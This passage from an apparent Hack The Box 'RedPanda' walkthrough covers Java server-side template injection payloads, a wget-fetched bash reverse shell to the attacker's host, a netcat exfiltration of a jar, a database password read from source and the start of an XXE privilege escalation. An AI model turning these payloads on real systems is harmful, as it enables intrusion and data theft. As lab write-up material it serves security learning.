<span id="cb2-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb2-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Referer:</span> http://10.10.11.170:8080/</span>
<span id="cb2-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Upgrade-Insecure-Requests:</span> 1</span>
<span id="cb2-14"></span>
<span id="cb2-15"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>{T<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java.lang.System</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">.getenv()</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb2-16"></span>
<span id="cb2-17"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response:</span></span>
<span id="cb2-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb2-19"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>h2 <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"searched"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb2-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">You</span> searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-jar</span> /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}</span>
<span id="cb2-21"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/h2<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Going to Github <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java">PayloadAllTheThings</a> we find a one-liner to execute commands, and with this we’re able get callbacks from the victim:</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request</span></span>
<span id="cb3-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>{T<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java.lang.Runtime</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">.getRuntime()</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.exec</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'curl http://10.10.14.6/test'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-3"></span>
<span id="cb3-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Callback</span></span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb3-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.170</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [15/Aug/2022 21:37:09] code 404, message File not found</span>
<span id="cb3-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.170</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [15/Aug/2022 21:37:09] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /test HTTP/1.1"</span> 404 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>Trying a bunch of one-liners fails, I am not able to get a reverse shell. So instead we go to create a payload and upload it to the victim.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> revshell.sh</span></code></pre></div>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request 1 - Upload</span></span>
<span id="cb5-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>{T<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java.lang.Runtime</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">.getRuntime()</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.exec</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'wget http://10.10.14.6/revshell.sh'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request 2 - Execute</span></span>
<span id="cb5-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">name</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>{T<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java.lang.Runtime</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">.getRuntime()</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.exec</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'bash revshell.sh'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 443 </span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 443 ...</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.6</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.170]</span> 32894</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">879</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/tmp/hsperfdata_woodenk$</span> </span>
<span id="cb6-7"></span>
<span id="cb6-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:~$</span> cat user.txt</span>
<span id="cb6-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4f591f5aaa56e50ec3bb7ac485cc81c3</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>Root</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<ul>
<li>We’re unable to run <code>sudo -l</code> due to the lack of password</li>
<li>The directory <code>.ssh</code> doesn’t exist so we can’t steal <code>id_rsa</code> for persistance</li>
</ul>
<p>Manually enumerating the box we find the sensitive web files at <code>/opt/panda_search</code>. Digging deeper we find the sql connection including the password for user <code>Woodenk</code>.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$</span> cat MainController.java</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn</span> = DriverManager.getConnection<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jdbc:mysql://localhost:3306/red_panda"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"woodenk"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RedPandazRule"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span></code></pre></div>
<p>Looking in the MySQL Server there’s nothing of use however, only pictures of red pandas.</p>
<p>Before enumerating automatically with linPEAS etc I like to use <code>pspy64</code> to see if there’s anything obvious being executed as root that we can exploit, so lets look at that.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6/pspy64</span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> chmod +x pspy64 </span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> ./pspy64</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18234  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/run_credits.sh </span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18233  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18236  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-jar</span> /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar </span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:36:01 CMD: UID=0    PID=18235  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> /root/run_credits.sh </span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:36:53 CMD: UID=0    PID=18257  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> </span>
<span id="cb8-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18270  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb8-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18271  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/run_credits.sh </span>
<span id="cb8-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18272  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> /root/run_credits.sh </span>
<span id="cb8-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/16</span> 10:38:01 CMD: UID=0    PID=18273  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">java</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-jar</span> /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar </span></code></pre></div>
<p>Okay so we see a .jar-file being executed every 2 minutes by root (UID=0), lets download that file and investigate it.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lp</span> 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> final-1.0-jar-with-dependencies.jar</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/opt/credit-score/LogParser/final/target$</span> nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> 3 10.10.14.6 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> final-1.0-jar-with-dependencies.jar</span></code></pre></div>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>The jar-file has a lot to unpack and you really need focus to keep your ducks in a row. I use <strong>jd-gui</strong> to open and analyze the jar. Ill try to go through all the requirements, step by step, and what we need to do to pass to code execution through <strong>XXE</strong>.</p>
<p><strong>Application Code:</strong></p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb10-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">class</span> App <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-2">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Map</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseLog</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-3">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span> strings <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">split</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\\</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span><span class="sc" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">\\</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-4">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Map</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> map <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">HashMap</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;&gt;();</span></span>
<span id="cb10-5">    map<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">put</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"status_code"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">valueOf</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseInt</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>strings<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">])));</span></span>
<span id="cb10-6">    map<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">put</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ip"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> strings<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]);</span></span>
<span id="cb10-7">    map<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">put</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user_agent"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> strings<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]);</span></span>
<span id="cb10-8">    map<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">put</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> strings<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]);</span></span>
<span id="cb10-9">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> map<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-10">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb10-11">  </span>
<span id="cb10-12">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">boolean</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">isImage</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> filename<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-13">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>filename<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">contains</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">".jpg"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb10-14">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> </span>
<span id="cb10-15">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-16">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb10-17">  </span>
<span id="cb10-18">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getArtist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">throws</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">IOException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> JpegProcessingException <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-19">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> fullpath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/opt/panda_search/src/main/resources/static"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb10-20">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> jpgFile <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fullpath<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-21">    Metadata metadata <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> JpegMetadataReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">readMetadata</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>jpgFile<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb10-22">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Directory dir <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> metadata<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getDirectories</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb10-23">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Tag tag <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> dir<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getTags</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
